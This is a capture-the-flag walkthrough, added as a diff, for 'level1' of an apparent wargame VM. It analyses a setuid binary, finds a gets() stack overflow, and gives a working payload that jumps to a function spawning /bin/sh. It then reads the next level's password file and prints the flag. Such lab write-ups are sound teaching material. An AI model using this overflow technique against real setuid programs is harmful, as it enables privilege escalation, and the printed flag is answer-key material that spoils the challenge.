@@ -1,0 +1,154 @@
+# Level1 Walkthrough
+
+The binary is owned by `level2` and has the setuid bit enabled:
+
+```sh
+ls -la level1
+```
+
+Relevant output:
+
+```txt
+-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
+```
+
+This means that when `level1` executes the binary, the process runs with the effective UID of `level2`.
+
+To start the static analysis, the binary was copied locally from the VM:
+
+```sh
+scp -O -P 4242 level1@192.168.64.4:/home/user/level1/level1 ./level1
+```
+
+Then it was inspected with `file`:
+
+```sh
+file level1
+```
+
+Output:
+
+```txt
+level1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=0e589e091e2f9d4b2ae80ea342992222e0f231b2, not stripped
+```
+
+The binary is not stripped, so the function symbols are still available.
+
+Then `strings` was used to look for readable strings and imported functions:
+
+```sh
+strings ./level1
+```
+
+Relevant output:
+
+```txt
+gets
+stdout
+system
+fwrite
+Good... Wait what?
+/bin/sh
+```
+
+This showed that the program probably reads from standard input, writes text, and contains a call to `system` with `/bin/sh` available in the binary.
+
+Since the binary is not stripped, `nm` was used to list its symbols:
+
+```sh
+nm ./level1
+```
+
+Relevant output:
+
+```txt
+08048480 T main
+08048444 T run
+         U gets@@GLIBC_2.0
+         U fwrite@@GLIBC_2.0
+         U system@@GLIBC_2.0
+```
+
+This showed two relevant functions, `main` and `run`. The `run` function is located at address `0x08048444`.
+
+The `run` function was then disassembled:
+
+```sh
+objdump -d ./level1 | grep -A20 '<run>'
+```
+
+Relevant output:
+
+```asm
+08048444 <run>:
+ 804846d: e8 de fe ff ff        call   8048350 <fwrite@plt>
+ 8048472: c7 04 24 84 85 04 08  movl   $0x8048584,(%esp)
+ 8048479: e8 e2 fe ff ff        call   8048360 <system@plt>
+```
+
+This confirmed that `run` writes a message and then calls `system`. Using the strings found earlier, this corresponds to:
+
+```c
+fwrite("Good... Wait what?\n", 1, 19, stdout);
+system("/bin/sh");
+```
+
+After that, `main` was disassembled:
+
+```sh
+objdump -d ./level1 | grep -A20 '<main>'
+```
+
+Relevant output:
+
+```asm
+08048480 <main>:
+ 8048486: 83 ec 50              sub    $0x50,%esp
+ 8048489: 8d 44 24 10           lea    0x10(%esp),%eax
+ 804848d: 89 04 24              mov    %eax,(%esp)
+ 8048490: e8 ab fe ff ff        call   8048340 <gets@plt>
+ 8048495: c9                    leave
+ 8048496: c3                    ret
+```
+
+This confirmed that `main` calls `gets` on a local stack buffer. `gets` is unsafe because it reads from standard input without checking the size of the destination buffer. This allows a buffer overflow.
+
+The `main` function never calls `run` normally. The idea is therefore to overflow the buffer used by `gets` and replace the return address of `main` with the address of `run`.
+
+The address of `run` is:
+
+```txt
+0x08048444
+```
+
+On i386, addresses are written in little-endian order, so the bytes are:
+
+```txt
+\x44\x84\x04\x08
+```
+
+The offset to the return address is 76 bytes. The payload is therefore 76 filler bytes followed by the address of `run`:
+
+```sh
+(python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
+```
+
+Output:
+
+```txt
+Good... Wait what?
+```
+
+The `cat` keeps standard input open so the spawned shell remains usable.
+
+The shell runs with `level2` privileges because the binary is setuid `level2`. The flag can then be read:
+
+```sh
+cat /home/user/level2/.pass
+```
+
+Flag:
+
+```txt
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
